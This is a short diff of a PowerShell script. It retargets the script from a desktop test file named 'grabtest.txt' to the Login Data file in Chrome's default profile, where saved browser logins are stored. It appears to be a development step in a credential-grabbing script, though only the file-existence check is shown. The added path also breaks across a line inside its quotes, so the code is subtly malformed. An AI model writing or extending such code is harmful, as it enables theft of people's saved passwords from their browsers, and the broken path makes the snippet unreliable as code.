@@ -1,5 +1,6 @@
 # Set the path to your file
-$filePath = "$env:USERPROFILE\Desktop\grabtest.txt"
+$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data
+"
 
 # Check if the file exists
 if (-Not (Test-Path $filePath)) {
